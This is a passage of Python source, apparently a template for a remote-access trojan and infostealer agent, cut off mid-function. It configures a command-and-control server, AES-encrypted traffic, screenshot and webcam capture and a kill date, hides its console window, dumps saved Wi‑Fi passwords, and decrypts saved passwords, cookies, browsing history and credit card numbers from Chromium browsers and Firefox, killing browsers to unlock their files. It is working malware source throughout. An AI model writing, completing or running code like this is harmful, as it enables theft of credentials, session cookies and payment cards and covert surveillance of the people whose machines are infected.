import sys
import subprocess
import platform
import random
from datetime import datetime, timedelta

def install_module(module_name, pip_name=None):
    """Helper function to install missing modules"""
    pip_name = pip_name or module_name
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
        print(f"Successfully installed {{module_name}}")
        return True
    except subprocess.CalledProcessError:
        print(f"Failed to install {{module_name}}")
        return False

# List of required modules with their pip names if different
required_modules = [
    ('urllib3', None),
    ('Crypto', 'pycryptodome'),
    ('requests', None),
    ('pyautogui', None),
    ('psutil', None),
    ('keyboard', 'pynput'),
    ('socketio', 'python-socketio'),
    ('websocket', 'websocket-client'),
    ('mss', None),
    ('Pillow', None),
    ('opencv-python', None),
    ('numpy', None)
]

# Check and install missing modules
for module, pip_name in required_modules:
    try:
        if module == 'wintypes':
            import ctypes
            from ctypes import wintypes
        elif module == 'datetime':
            from datetime import datetime, timedelta
        elif module == 'xml.etree.ElementTree':
            import xml.etree.ElementTree as ET
        elif module == 'Crypto':
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad, unpad
        elif module == 'keyboard':
            from pynput import keyboard
        else:
            __import__(module.split('.')[0])
    except ImportError:
        print(f"Module {{module}} not found. Attempting to install...")
        if pip_name:
            install_module(module, pip_name)
        else:
            install_module(module)

# Now proceed with the imports
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    import os
    import sys
    import json
    import base64
    import sqlite3
    import time
    import platform
    import subprocess
    import random
    import io
    import logging
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    import requests
    import pyautogui
    pyautogui.FAILSAFE = False

    # Calculate DPI scale factor for accurate mouse positioning on high DPI displays
    def get_scale_factor():
        try:
            if platform.system() == 'Windows':
                import ctypes
                user32 = ctypes.windll.user32
                physical_width = user32.GetSystemMetrics(0)
                physical_height = user32.GetSystemMetrics(1)
                virtual_width, virtual_height = pyautogui.size()
                scale_x = physical_width / virtual_width
                scale_y = physical_height / virtual_height
                return scale_x, scale_y
            else:
                # For other platforms, assume 1:1 scaling
                return 1.0, 1.0
        except:
            return 1.0, 1.0

    SCALE_X, SCALE_Y = get_scale_factor()
    if platform.system() == 'Windows':
        import winreg
        from ctypes import wintypes
    import shutil
    import ctypes
    import psutil
    import socket
    import threading
    import select
    from pynput import keyboard
    import configparser
    import xml.etree.ElementTree as ET
    import socketio as socketio
    import websocket
    import tempfile
    import multiprocessing
    from PIL import Image
    import numpy as np
  
    
    import cv2
    
    print("All modules imported successfully!")

    

except ImportError as e:
    print(f"Failed to import module: {{e}}")
    

def main():
    

    if platform.system() == 'Windows':
        try:
            # Get the handle to the current console window
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                # FreeConsole() detaches the process from its console
                # This is more effective than just hiding the window for SendInput()
                ctypes.windll.kernel32.FreeConsole()
                
                # Alternatively, if you want to keep the console but hide it:
                # ctypes.windll.user32.ShowWindow(hwnd, 0) # SW_HIDE
        except Exception as e:
            pass # Silent fail as there might not be a console

    


# ======================
# Configuration
# ======================
class Config:
    def __init__(self):
        self.C2_SERVER = "{server_url}"
        self.AES_KEY = {aes_key}
        self.AES_IV = {aes_iv}
        self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.CHECKIN_INTERVAL = {checkin_interval}
        self.SOCKS5_PORT = 1080
        self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
        self.DEBUG = True
        self.TAKE_SCREENSHOTS = {take_screenshots}
        self.SCREENSHOT_FREQUENCY = {screenshot_frequency}
        self.TAKE_WEBCAM = {take_webcam}
        self.WEBCAM_FREQUENCY = {webcam_frequency}
        self.KILLDATE_ENABLED = {killdate_enabled}
        self.KILLDATE = "{killdate}" if {killdate_enabled} else ""


# ======================
# Encryption
# ======================
class Crypto:
    def __init__(self, key, iv):
        if len(key) not in {{16, 24, 32}}:
            raise ValueError(f"Invalid AES key length ({{len(key)}} bytes)")
        if len(iv) != 16:
            raise ValueError(f"Invalid AES IV length ({{len(iv)}} bytes)")
        self.key = key
        self.iv = iv

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded_data = pad(json.dumps(data).encode(), AES.block_size)
        ct_bytes = cipher.encrypt(padded_data)
        return base64.b64encode(ct_bytes).decode()

    def decrypt(self, enc_data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        ct = base64.b64decode(enc_data)
        pt = cipher.decrypt(ct)
        return json.loads(unpad(pt, AES.block_size))

# ======================
# Credential Harvester
# ======================
class CredentialHarvester:
    @staticmethod
    def get_wifi_passwords():
        try:
            profiles = []
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
            profiles = [line.split(":")[1].strip() for line in results if "All User Profile" in line]

            wifi_passwords = []
            for profile in profiles:
                try:
                    password_result = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                    ).decode('utf-8', errors='ignore').split('\n')
                    password = [line.split(":")[1].strip() for line in password_result if "Key Content" in line][0]
                    wifi_passwords.append({{
                        "ssid": profile,
                        "password": password
                    }})
                except:
                    continue

            return wifi_passwords
        except:
            return []

    @staticmethod
    def get_browser_credentials():
        """Extract browser passwords and history using browserextractor logic"""
        try:
            # Import and use the Browsers class from browserextractor
            # Browsers class code is embedded directly in the agent template
            # to avoid external module dependencies

            import os
            import sqlite3
            import json
            import base64
            import shutil
            import requests
            from Crypto.Cipher import AES
            import win32crypt
            import zipfile
            import io
            import time
            import random
            from typing import Union
            from win32crypt import CryptUnprotectData

            class Browsers:
                def __init__(self):
                    self.appdata = os.getenv('LOCALAPPDATA')
                    self.roaming = os.getenv('APPDATA')
                    self.browsers = {{
                        'kometa': self.appdata + '\\Kometa\\User Data',
                        'orbitum': self.appdata + '\\Orbitum\\User Data',
                        'cent-browser': self.appdata + '\\CentBrowser\\User Data',
                        '7star': self.appdata + '\\7Star\\7Star\\User Data',
                        'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
                        'vivaldi': self.appdata + '\\Vivaldi\\User Data',
                        'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
                        'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
                        'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
                        'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
                        'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
                        'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
                        'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                        'iridium': self.appdata + '\\Iridium\\User Data',
                        'opera': self.roaming + '\\Opera Software\\Opera Stable',
                        'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
                        'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data',
                        'firefox': 'firefox'  # Special marker - handled separately
                    }}
                    
                    # Firefox profile directories (checked separately)
                    self.firefox_profile_dirs = [
                        os.path.join(self.roaming, 'Mozilla', 'Firefox', 'Profiles'),
                        os.path.join(self.appdata, 'Mozilla', 'Firefox', 'Profiles')
                    ]

                    self.profiles = [
                        'Default',
                        'Profile 1',
                        'Profile 2',
                        'Profile 3',
                        'Profile 4',
                        'Profile 5',
                    ]

                    # Initialize data structures to collect results
                    self.credentials_data = []
                    self.history_data = []
                    self.temp_path = os.path.join(tempfile.gettempdir(), "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10)))
                    if not os.path.exists(self.temp_path):
                        os.makedirs(self.temp_path)
                    # Create Browser subdirectory for cookie storage
                    self.browser_output_dir = os.path.join(self.temp_path, "Browser")
                    if not os.path.exists(self.browser_output_dir):
                        os.makedirs(self.browser_output_dir)
                    print("Starting browser data collection...")

                    # FIXED: Process sequentially instead of with threads to avoid:
                    # 1. Database locking issues (can't read files while browser has them open)
                    # 2. Race conditions when accessing shared data structures
                    # 3. Lambda closure issues with loop variables
                    
                    for name, path in self.browsers.items():
                        if not os.path.isdir(path):
                            print(f"Browser path not found: {{path}}")
                            continue

                        print(f"Processing browser: {{name}} at {{path}}")
                        
                        # FIXED: Get master key for this browser (may differ per profile in some cases)
                        master_key = self.get_master_key(path + '\\Local State')
                        if not master_key:
                            print(f"Could not get master key for {{name}}")
                            continue

                        for profile in self.profiles:
                            # FIXED: Copy database files to temp location before reading to avoid locking
                            # Process each data type sequentially
                            try:
                                self._process_passwords(name, path, profile, master_key)
                            except Exception as e:
                                print(f"Error processing passwords for {{name}} {{profile}}: {{e}}")
                            
                            try:
                                self._process_cookies(name, path, profile, master_key)
                            except Exception as e:
                                print(f"Error processing cookies for {{name}} {{profile}}: {{e}}")
                            
                            try:
                                self._process_history(name, path, profile)
                            except Exception as e:
                                print(f"Error processing history for {{name}} {{profile}}: {{e}}")
                            
                            try:
                                self._process_credit_cards(name, path, profile, master_key)
                            except Exception as e:
                                print(f"Error processing credit cards for {{name}} {{profile}}: {{e}}")

                    print(f"Browser data collection complete. Credentials: {{len(self.credentials_data)}}, History: {{len(self.history_data)}}")

                    # Process Firefox separately (has different profile structure)
                    self._process_firefox_browser()

                    print(f"Final browser data collection complete. Credentials: {{len(self.credentials_data)}}, History: {{len(self.history_data)}}")

                def get_master_key(self, path: str):
                    try:
                        with open(path, "r", encoding="utf-8") as f: local_state = json.load(f)
                        import ctypes; from ctypes import wintypes
                        class DATA_BLOB(ctypes.Structure): _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
                        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                        p_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
                        p_out = DATA_BLOB()
                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_in), None, None, None, None, 0, ctypes.byref(p_out)):
                            k = ctypes.string_at(p_out.pbData, p_out.cbData)
                            ctypes.windll.kernel32.LocalFree(p_out.pbData)
                            return k
                        return None
                    except: return None
                def decrypt_password(self, buff: bytes, master_key: bytes):
                    try:
                        if not buff: return ""
                        if buff.startswith(b"v10") or buff.startswith(b"v11"):
                            iv, payload = buff[3:15], buff[15:]
                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
                            return cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode(errors="ignore")
                        import ctypes; from ctypes import wintypes
                        class DATA_BLOB(ctypes.Structure): _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
                        p_in = DATA_BLOB(len(buff), ctypes.create_string_buffer(buff)); p_out = DATA_BLOB()
                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_in), None, None, None, None, 0, ctypes.byref(p_out)):
                            v = ctypes.string_at(p_out.pbData, p_out.cbData)
                            ctypes.windll.kernel32.LocalFree(p_out.pbData)
                            return v.decode(errors="ignore")
                        return ""
                    except: return ""
                def _copy_db_to_temp(self, db_path):
                    """Copy database file to temp location to avoid locking issues"""
                    if not os.path.isfile(db_path):
                        return None
                    temp_file = self.create_temp()
                    shutil.copy2(db_path, temp_file)
                    return temp_file

                def _process_passwords(self, name: str, path: str, profile: str, master_key: bytes):
                    """Process passwords - FIXED: copy to temp before reading"""
                    if name == 'opera' or name == 'opera-gx':
                        db_path = path + '\\Login Data'
                    else:
                        db_path = path + '\\' + profile + '\\Login Data'
                    
                    # Copy to temp to avoid locking
                    temp_db = self._copy_db_to_temp(db_path)
                    if not temp_db:
                        return
                    
                    try:
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        for results in cursor.fetchall():
                            if not results[0] or (not results[1] and not results[2]):
                                continue
                            url = results[0]
                            login = results[1]
                            password = self.decrypt_password(results[2], master_key)
                            self.credentials_data.append({{
                                "browser": name,
                                "profile": profile,
                                "url": url,
                                "username": login,
                                "password": password
                            }})
                        cursor.close()
                        conn.close()
                    finally:
                        # Clean up temp file
                        if temp_db and os.path.exists(temp_db):
                            try:
                                os.remove(temp_db)
                            except:
                                pass

                def _process_cookies(self, name: str, path: str, profile: str, master_key: bytes):
                    """Process cookies - FIXED: copy to temp before reading"""
                    if name == 'opera' or name == 'opera-gx':
                        db_path = path + '\\Network\\Cookies'
                    else:
                        db_path = path + '\\' + profile + '\\Network\\Cookies'
                    
                    # Copy to temp to avoid locking
                    temp_db = self._copy_db_to_temp(db_path)
                    if not temp_db:
                        return
                    
                    try:
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cookie_file_path = os.path.join(self.browser_output_dir, "cookies.txt")
                        with open(cookie_file_path, 'a', encoding="utf-8") as f:
                            f.write(f"\nBrowser: {{name}}     Profile: {{profile}}\n\n")
                            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                                host_key, c_name, c_path, encrypted_value, expires_utc = res
                                value = self.decrypt_password(encrypted_value, master_key)
                                if host_key and c_name and value != "":
                                    f.write(f"{{host_key}}\t{{'FALSE' if expires_utc == 0 else 'TRUE'}}\t{{c_path}}\t{{'FALSE' if host_key.startswith('.') else 'TRUE'}}\t{{expires_utc}}\t{{c_name}}\t{{value}}\n")
                        cursor.close()
                        conn.close()
                    finally:
                        # Clean up temp file
                        if temp_db and os.path.exists(temp_db):
                            try:
                                os.remove(temp_db)
                            except:
                                pass

                def _process_history(self, name: str, path: str, profile: str):
                    """Process history - already had temp file copy, kept that approach"""
                    if name == 'opera' or name == 'opera-gx':
                        db_path = path + '\\History'
                    else:
                        db_path = path + '\\' + profile + '\\History'
                    
                    # Copy to temp to avoid locking
                    temp_db = self._copy_db_to_temp(db_path)
                    if not temp_db:
                        print(f"History file not found: {{db_path}}")
                        return
                    
                    print(f"Processing history for {{name}} profile {{profile}}: {{db_path}}")
                    try:
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        results = cursor.execute("SELECT url, visit_count, title, last_visit_time FROM urls").fetchall()
                        print(f"Found {{len(results)}} history entries for {{name}}")
                        for res in results:
                            url, visit_count, title, last_visit_time = res
                            self.history_data.append({{
                                "browser": name,
                                "profile": profile,
                                "url": url,
                                "visit_count": visit_count,
                                "title": title or "",
                                "last_visit_time": last_visit_time or 0
                            }})
                        cursor.close()
                        conn.close()
                    finally:
                        # Clean up temp file
                        if temp_db and os.path.exists(temp_db):
                            try:
                                os.remove(temp_db)
                            except:
                                pass
                    print(f"History collection complete for {{name}}, total entries: {{len(self.history_data)}}")

                def _process_credit_cards(self, name: str, path: str, profile: str, master_key: bytes):
                    """Process credit cards - FIXED: copy to temp before reading"""
                    if name in ['opera', 'opera-gx']:
                        db_path = path + '\\Web Data'
                    else:
                        db_path = path + '\\' + profile + '\\Web Data'
                    
                    # Copy to temp to avoid locking
                    temp_db = self._copy_db_to_temp(db_path)
                    if not temp_db:
                        return
                    
                    try:
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cc_file_path = os.path.join(self.browser_output_dir, "cc's.txt")
                        with open(cc_file_path, 'a', encoding="utf-8") as f:
                            if os.path.getsize(cc_file_path) == 0:
                                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
                            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                                card_number = self.decrypt_password(card_number_encrypted, master_key)
                                f.write(f"{{name_on_card}}  |  {{expiration_month}}  |  {{expiration_year}}  |  {{card_number}}\n")
                        cursor.close()
                        conn.close()
                    finally:
                        # Clean up temp file
                        if temp_db and os.path.exists(temp_db):
                            try:
                                os.remove(temp_db)
                            except:
                                pass

                # Keep old method names for compatibility but they now call the fixed versions
                def passwords(self, name: str, path: str, profile: str):
                    # This is called by the old code path - just get master key and process
                    master_key = self.get_master_key(path + '\\Local State')
                    if master_key:
                        self._process_passwords(name, path, profile, master_key)

                def cookies(self, name: str, path: str, profile: str):
                    master_key = self.get_master_key(path + '\\Local State')
                    if master_key:
                        self._process_cookies(name, path, profile, master_key)

                def history(self, name: str, path: str, profile: str):
                    self._process_history(name, path, profile)

                def credit_cards(self, name: str, path: str, profile: str):
                    master_key = self.get_master_key(path + '\\Local State')
                    if master_key:
                        self._process_credit_cards(name, path, profile, master_key)

                def create_zip_and_send(self):
                    # No longer needed - data is collected directly into self.credentials and self.history
                    pass

                def create_zip(self, file_paths: list, zip_path: str):
                    with zipfile.ZipFile(zip_path, 'w') as zipf:
                        for file in file_paths:
                            if os.path.isfile(file):
                                zipf.write(file, os.path.basename(file))

                def create_temp(self, _dir: Union[str, os.PathLike] = None):
                    if _dir is None:
                        _dir = tempfile.gettempdir()
                    if not os.path.exists(_dir):
                        os.makedirs(_dir)
                    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
                    path = os.path.join(_dir, file_name)
                    open(path, "x").close()
                    return path

                def _process_firefox_browser(self):
                    try:
                        import ctypes
                        from ctypes import wintypes
                        print("Processing Firefox browser data...")
                        
                        firefox_profiles = []
                        for profile_dir in self.firefox_profile_dirs:
                            if os.path.exists(profile_dir):
                                for item in os.listdir(profile_dir):
                                    profile_path = os.path.join(profile_dir, item)
                                    if os.path.isdir(profile_path):
                                        firefox_profiles.append(profile_path)
                        
                        if not firefox_profiles:
                            print("No Firefox profiles found")
                            return
                        
                        # Find nss3.dll
                        nss_path = None
                        potential_paths = [
                            os.path.join(os.environ.get('ProgramFiles', 'C:\\Program Files'), 'Mozilla Firefox', 'nss3.dll'),
                            os.path.join(os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'), 'Mozilla Firefox', 'nss3.dll'),
                        ]
                        for path in potential_paths:
                            if os.path.exists(path):
                                nss_path = path
                                break
                        
                        nss = None
                        if nss_path:
                            try:
                                # We need to set the DLL directory to load dependencies of nss3.dll
                                try:
                                    os.add_dll_directory(os.path.dirname(nss_path))
                                except AttributeError:
                                    # Old Python version
                                    pass
                                nss = ctypes.CDLL(nss_path)
                            except Exception as e:
                                print(f"Failed to load nss3.dll: {{e}}")

                        # SECItem structure for NSS calls
                        class SECItem(ctypes.Structure):
                            _fields_ = [('type', ctypes.c_uint), ('data', ctypes.c_void_p), ('len', ctypes.c_uint)]

                        for profile_path in firefox_profiles:
                            print(f"Processing Firefox profile: {{profile_path}}")
                            
                            # Initialize NSS for this profile
                            initialized = False
                            if nss:
                                try:
                                    # NSS_Init expects the profile directory path
                                    if nss.NSS_Init(profile_path.encode('utf-8')) == 0:
                                        initialized = True
                                    else:
                                        print(f"NSS_Init failed for profile: {{profile_path}}")
                                except Exception as e:
                                    print(f"Error initializing NSS: {{e}}")

                            # Process passwords (logins.json)
                            try:
                                logins_db = os.path.join(profile_path, 'logins.json')
                                if os.path.exists(logins_db):
                                    with open(logins_db, 'r', encoding='utf-8') as f:
                                        logins_data = json.load(f)
                                        if 'logins' in logins_data:
                                            for entry in logins_data['logins']:
                                                enc_user = entry.get('encryptedUsername', '')
                                                enc_pass = entry.get('encryptedPassword', '')
                                                
                                                user = entry.get('username', '')
                                                password = entry.get('password', '')
                                                
                                                # If user/password are empty in logins.json, they are likely in the encrypted fields
                                                if initialized and nss:
                                                    # Attempt decryption
                                                    try:
                                                        # Decrypt Username
                                                        decoded_user = base64.b64decode(enc_user)
                                                        item_in_user = SECItem(0, ctypes.cast(ctypes.create_string_buffer(decoded_user), ctypes.c_void_p), len(decoded_user))
                                                        item_out_user = SECItem(0, None, 0)
                                                        if nss.PK11SDR_Decrypt(ctypes.byref(item_in_user), ctypes.byref(item_out_user), None) == 0:
                                                            user = ctypes.string_at(item_out_user.data, item_out_user.len).decode('utf-8', errors='ignore')
                                                        
                                                        # Decrypt Password
                                                        decoded_pass = base64.b64decode(enc_pass)
                                                        item_in_pass = SECItem(0, ctypes.cast(ctypes.create_string_buffer(decoded_pass), ctypes.c_void_p), len(decoded_pass))
                                                        item_out_pass = SECItem(0, None, 0)
                                                        if nss.PK11SDR_Decrypt(ctypes.byref(item_in_pass), ctypes.byref(item_out_pass), None) == 0:
                                                            password = ctypes.string_at(item_out_pass.data, item_out_pass.len).decode('utf-8', errors='ignore')
                                                    except Exception as de:
                                                        print(f"Decryption error: {{de}}")

                                                self.credentials_data.append({{
                                                    "browser": "firefox",
                                                    "profile": os.path.basename(profile_path),
                                                    "url": entry.get('hostname', ''),
                                                    "username": user if user else (enc_user if enc_user else "[Unknown]"),
                                                    "password": password if password else (enc_pass if enc_pass else "")
                                                }})
                            except Exception as e:
                                print(f"Error processing Firefox logins: {{e}}")
                            
                            if initialized and nss:
                                try:
                                    nss.NSS_Shutdown()
                                except: pass

                            # Process history (places.sqlite)
                            try:
                                history_db = os.path.join(profile_path, 'places.sqlite')
                                temp_db = self._copy_db_to_temp(history_db)
                                if temp_db:
                                    conn = sqlite3.connect(temp_db)
                                    cursor = conn.cursor()
                                    results = cursor.execute("SELECT url, visit_count, title, last_visit_date FROM moz_places").fetchall()
                                    for res in results:
                                        self.history_data.append({{
                                            "browser": "firefox",
                                            "profile": os.path.basename(profile_path),
                                            "url": res[0] or "",
                                            "visit_count": res[1] or 0,
                                            "title": res[2] or "",
                                            "last_visit_time": res[3] or 0
                                        }})
                                    conn.close(); os.remove(temp_db)
                            except Exception as e:
                                print(f"Error processing Firefox history: {{e}}")

                            # Process cookies (cookies.sqlite)
                            try:
                                cookies_db = os.path.join(profile_path, 'cookies.sqlite')
                                temp_db = self._copy_db_to_temp(cookies_db)
                                if temp_db:
                                    conn = sqlite3.connect(temp_db)
                                    cursor = conn.cursor()
                                    cookie_file_path = os.path.join(self.browser_output_dir, "cookies.txt")
                                    with open(cookie_file_path, 'a', encoding="utf-8") as f:
                                        f.write(f"\nBrowser: firefox     Profile: {{os.path.basename(profile_path)}}\n\n")
                                        for res in cursor.execute("SELECT host, name, path, value, expiry, isSecure FROM moz_cookies").fetchall():
                                            host, name, path, value, expiry, is_secure = res
                                            if host and name:
                                                domain_flag = "TRUE" if host.startswith(".") else "FALSE"
                                                secure_flag = "TRUE" if is_secure else "FALSE"
                                                f.write(f"{{host}}\t{{domain_flag}}\t{{path}}\t{{secure_flag}}\t{{expiry or 0}}\t{{name}}\t{{value}}\n")
                                    conn.close(); os.remove(temp_db)
                            except Exception as e:
                                print(f"Error processing Firefox cookies: {{e}}")
                        
                        print(f"Firefox processing complete.")
                    except Exception as e:
                        print(f"Error in Firefox browser processing: {{e}}")
            # Create Browsers instance to extract data directly
            browsers = Browsers()

            # The Browsers class now extracts data directly and returns structured data
            # No need to parse files - data is returned directly

            data = {{
                "credentials": browsers.credentials_data,
                "history": browsers.history_data,
                "wifi": CredentialHarvester.get_wifi_passwords()
            }}
            
            # Cleanup temp files
            try:
                if os.path.exists(browsers.temp_path):
                    shutil.rmtree(browsers.temp_path, ignore_errors=True)
            except:
                pass
                
            return data

        except Exception as e:
            print(f"Error extracting browser data: {{e}}")
            return {{
                "credentials": [],
                "history": [],
                "wifi": CredentialHarvester.get_wifi_passwords()
            }}

# ======================
# Cookie Stealer
# ======================
class CookieStealer:
    def __init__(self, logger=None, config=None):
        self.logger = logger or self._create_default_logger()
        self.config = config
        self.chrome_debug_port = 9222
        self.edge_debug_port = 9223
        self.timeout = 10
        self.unique_domains = set()
        self.used_junction_names = set()
        
        # Browser configurations
        self.CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
        self.CHROME_USER_DATA_DIR = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data')
        self.CHROME_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'chrome_cookies.json')

        self.EDGE_PATH = rf"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        self.EDGE_USER_DATA_DIR = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
        self.EDGE_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'edge_cookies.json')

        self.FIREFOX_PROFILE_DIRS = [
            os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Packages', 'Mozilla.Firefox_*', 'LocalCache', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
        ]
        self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')

    def steal_cookies(self):
        """Main method to steal cookies from all browsers and all profiles"""
        results = []
        
        # Chrome
        chrome_results = self._process_browser_cookies(
            'chrome',
            self.CHROME_PATH,
            self.chrome_debug_port,
            self.CHROME_USER_DATA_DIR
        )
        if chrome_results:
            if isinstance(chrome_results, list):
                results.extend(chrome_results)
            else:
                results.append(chrome_results)
        
        # Edge
        edge_results = self._process_browser_cookies(
            'edge',
            self.EDGE_PATH,
            self.edge_debug_port,
            self.EDGE_USER_DATA_DIR
        )
        if edge_results:
            if isinstance(edge_results, list):
                results.extend(edge_results)
            else:
                results.append(edge_results)
        
        # Firefox - Kill process first to force session cookies to disk
        self._kill_browser("firefox.exe")
        firefox_data = self._process_firefox_cookies()
        if firefox_data:
            if isinstance(firefox_data, list):
                results.extend(firefox_data)
            else:
                results.append(firefox_data)
        
        return results

    def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
        """Process all Chrome/Edge profiles found in User Data folder using direct SQLite extraction"""
        all_browser_results = []
        try:
            self._log('info', f"Processing {{browser_name}} cookies (Direct SQLite)")

            if not os.path.exists(user_data_dir):
                self._log('error', f"User data directory not found: {{user_data_dir}}")
                return None

            # Get Master Key for decryption
            master_key = self._get_master_key(user_data_dir)
            if not master_key:
                self._log('error', f"Failed to retrieve master key for {{browser_name}}")
                return None

            # Identify all profile directories
            profiles = []
            if os.path.exists(os.path.join(user_data_dir, 'Default')):
                profiles.append('Default')
            
            for item in os.listdir(user_data_dir):
                if item.startswith('Profile ') and os.path.isdir(os.path.join(user_data_dir, item)):
                    profiles.append(item)
            
            if not profiles:
                profiles = ['Default']

            self._log('info', f"Found {{len(profiles)}} {{browser_name}} profiles: {{', '.join(profiles)}}")

            for profile in profiles:
                try:
                    self._log('info', f"Attempting direct extraction for profile: {{profile}}")
                    
                    # Kill browser to release locks
                    self._kill_browser(os.path.basename(browser_path))

                    # Locate cookie database (check both old and new locations)
                    cookie_locations = [
                        os.path.join(user_data_dir, profile, 'Network', 'Cookies'),
                        os.path.join(user_data_dir, profile, 'Cookies')
                    ]
                    
                    cookie_db_path = None
                    for loc in cookie_locations:
                        if os.path.exists(loc):
                            cookie_db_path = loc
                            break
                    
                    if not cookie_db_path:
                        self._log('warning', f"Cookies file not found for {{browser_name}} profile {{profile}}")
                        continue

                    # Extract cookies using SQLite and Master Key
                    cookies = self._extract_chromium_cookies(cookie_db_path, master_key)
                    if not cookies:
                        continue

                    # Transform cookies to standard format
                    transformed = self._transform_cookies(cookies, browser_name)

                    # Package cookies for transmission
                    packaged = self._package_cookies(transformed, f"{{browser_name}}_{{profile.lower().replace(' ', '_')}}")
                    if packaged:
                        all_browser_results.append(packaged)

                except Exception as e:
                    self._log('error', f"Error processing {{browser_name}} profile {{profile}}: {{str(e)}}")
                    continue

            return all_browser_results if all_browser_results else None

        except Exception as e:
            self._log('error', f"{{browser_name}} cookie processing failed: {{str(e)}}")
            return None

    def _get_master_key(self, user_data_dir):
        """Retrieve and decrypt the Chromium master key from Local State"""
        try:
            local_state_path = os.path.join(user_data_dir, 'Local State')
            if not os.path.exists(local_state_path):
                return None

            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())

            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            # Remove 'DPAPI' prefix
            encrypted_key = encrypted_key[5:]

            # Decrypt using DPAPI (CryptUnprotectData)
            import ctypes
            from ctypes import wintypes

            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]

            p_data_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
            p_data_out = DATA_BLOB()
            p_optional_entropy = None
            p_reserved = None
            p_prompt_struct = None
            dw_flags = 0x01 # CRYPTPROTECT_UI_FORBIDDEN

            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_data_in), None, p_optional_entropy, p_reserved, p_prompt_struct, dw_flags, ctypes.byref(p_data_out)):
                decrypted_key = ctypes.string_at(p_data_out.pbData, p_data_out.cbData)
                ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
                return decrypted_key
            return None
        except Exception as e:
            self._log('error', f"Failed to get master key: {{str(e)}}")
            return None

    def _decrypt_chromium_value(self, value, master_key):
        """Decrypt Chromium cookie value (v10/AES-GCM or DPAPI)"""
        try:
            if value[:3] == b'v10' or value[:3] == b'v11':
                iv = value[3:15]
                payload = value[15:]
                # The payload contains the tag at the end (16 bytes)
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)
                # Remove auth tag (last 16 bytes)
                return decrypted[:-16].decode('utf-8', errors='ignore')
            else:
                # Older versions used DPAPI directly
                import ctypes
                from ctypes import wintypes

                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]

                p_data_in = DATA_BLOB(len(value), ctypes.create_string_buffer(value))
                p_data_out = DATA_BLOB()
                
